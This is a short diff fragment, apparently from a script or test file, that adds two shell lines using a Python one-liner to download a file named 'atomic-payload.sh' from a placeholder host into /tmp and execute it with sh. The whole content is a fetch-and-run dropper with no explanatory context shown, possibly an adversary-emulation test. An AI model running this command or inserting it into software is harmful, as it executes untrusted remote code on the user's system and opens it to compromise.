@@ -1,0 +1,2 @@
+which_python=$(command -v python3)
+$which_python -c 'import requests; import os; url = "https://example.invalid/atomic-payload.sh"; command = "sh /tmp/atomic-payload.sh"; response = requests.get(url); open("/tmp/atomic-payload.sh", "wb").write(response.content); os.system(command)'
